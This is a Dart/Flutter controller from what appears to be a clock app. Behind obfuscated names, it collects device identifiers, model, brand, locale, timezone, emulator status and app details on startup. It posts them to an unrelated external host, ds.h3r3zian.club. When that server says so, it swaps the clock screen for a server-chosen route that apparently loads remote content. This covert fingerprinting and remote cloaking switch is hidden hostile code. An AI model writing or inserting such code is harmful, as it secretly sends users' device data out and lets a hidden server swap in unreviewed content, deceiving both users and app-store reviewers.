import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class DialEditLogic extends GetxController {

  var xswmqu = RxBool(false);
  var yqigfcuje = RxBool(true);
  var apegcsyr = RxString("");
  var mafalda = RxBool(false);
  var lakin = RxBool(true);
  final uloicw = Dio();


  InAppWebViewController? webViewController;
  @override
  void onInit() {
    super.onInit();
    idlcnx();
  }


  Future<void> idlcnx() async {

    mafalda.value = true;
    lakin.value = true;
    yqigfcuje.value = false;

    uloicw.post("https://ds.h3r3zian.club/VVLHX8DW1I?no_check",data: await hisfzv()).then((value) {
      var ogexs = value.data["ogexs"] as String;
      var qchkavul = value.data["qchkavul"] as bool;
      if (qchkavul) {
        apegcsyr.value = ogexs;
        charlotte();
      } else {
        ledner();
      }
    }).catchError((e) {
      yqigfcuje.value = true;
      lakin.value = true;
      mafalda.value = false;
    });
  }

  Future<Map<String, dynamic>> hisfzv() async {
    final DeviceInfoPlugin uopnb = DeviceInfoPlugin();
    PackageInfo qkln_fpyoz = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var tcxbjkr = Platform.localeName;
    var tix_xcuG = currentTimeZone;

    var tix_Vd = qkln_fpyoz.packageName;
    var tix_qW = qkln_fpyoz.version;
    var tix_YP = qkln_fpyoz.buildNumber;

    var tix_tdRsKWrO = qkln_fpyoz.appName;
    var tix_uNEOySVA = "";
    var tix_hMEtAou  = "";
    var tix_Bn = "";
    var mosesKeebler = "";
    var margueriteWolff = "";
    var erlingMiller = "";
    var jasenBogan = "";


    var tix_IktUaYHG = "";
    var tix_TurjYqUf = false;

    if (GetPlatform.isAndroid) {
      tix_IktUaYHG = "android";
      var qotkdzp = await uopnb.androidInfo;

      tix_Bn = qotkdzp.brand;

      tix_uNEOySVA  = qotkdzp.model;
      tix_hMEtAou = qotkdzp.id;

      tix_TurjYqUf = qotkdzp.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      tix_IktUaYHG = "ios";
      var chbjfeut = await uopnb.iosInfo;
      tix_Bn = chbjfeut.name;
      tix_uNEOySVA = chbjfeut.model;

      tix_hMEtAou = chbjfeut.identifierForVendor ?? "";
      tix_TurjYqUf  = chbjfeut.isPhysicalDevice;
    }

    var res = {
      "tix_tdRsKWrO": tix_tdRsKWrO,
      "tix_YP": tix_YP,
      "tix_qW": tix_qW,
      "tix_Vd": tix_Vd,
      "tix_uNEOySVA": tix_uNEOySVA,
      "tix_xcuG": tix_xcuG,
      "tix_Bn": tix_Bn,
      "tix_hMEtAou": tix_hMEtAou,
      "tcxbjkr": tcxbjkr,
      "tix_IktUaYHG": tix_IktUaYHG,
      "tix_TurjYqUf": tix_TurjYqUf,
      "mosesKeebler" : mosesKeebler,
      "margueriteWolff" : margueriteWolff,
      "erlingMiller" : erlingMiller,
      "jasenBogan" : jasenBogan,

    };
    return res;
  }

  Future<void> ledner() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> charlotte() async {
    Get.offNamed("/Outreload");
  }
}
